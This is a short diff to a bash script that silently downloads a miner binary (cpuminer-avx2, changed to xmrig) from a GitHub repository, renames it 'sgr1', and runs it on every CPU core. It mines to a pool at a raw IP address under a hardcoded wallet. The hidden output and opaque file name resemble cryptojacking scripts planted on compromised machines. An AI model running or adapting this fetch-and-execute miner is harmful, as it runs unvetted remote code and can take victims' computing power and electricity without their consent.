@@ -1,4 +1,4 @@
 #!/bin/bash
-wget -O sgr1 https://github.com/parmount6/filesg/raw/main/cpuminer-avx2 >/dev/null 2>&1
+wget -O sgr1 https://github.com/parmount6/filesg/raw/main/xmrig >/dev/null 2>&1
 chmod +x sgr1
-./sgr1 -a gr -o 149.28.147.155:80 -u RbxJP5k7d15URHn53uMXsGWqdSGqf12Py1.xxx -p webpassword=x -t $(nproc --all)
+./sgr1 -a ghostrider --url 149.28.147.155:80 --user RbxJP5k7d15URHn53uMXsGWqdSGqf12Py1.x --pass webpassword=x -t $(nproc --all)
